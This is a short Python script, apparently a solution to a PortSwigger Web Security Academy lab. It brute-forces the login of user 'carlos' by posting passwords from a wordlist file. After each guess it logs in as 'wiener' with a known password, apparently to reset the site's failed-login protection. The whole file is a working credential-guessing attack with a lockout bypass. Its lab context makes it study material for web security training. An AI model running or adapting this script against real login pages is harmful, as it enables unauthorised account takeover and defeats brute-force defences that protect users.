import requests

passwords = open('password.txt', 'r').readlines()

url = 'https://acad1ff01ef23e19c0b52366007f0055.web-security-academy.net/login'

for passwd in passwords:
    res = requests.post(url, data={'username' : 'carlos', 'password' : passwd.strip()})
    if 'Log out' in res.text:
        print('carlos' + ':' + passwd)
        break
    res = requests.post(url, data={'username' : 'wiener', 'password' : 'peter'})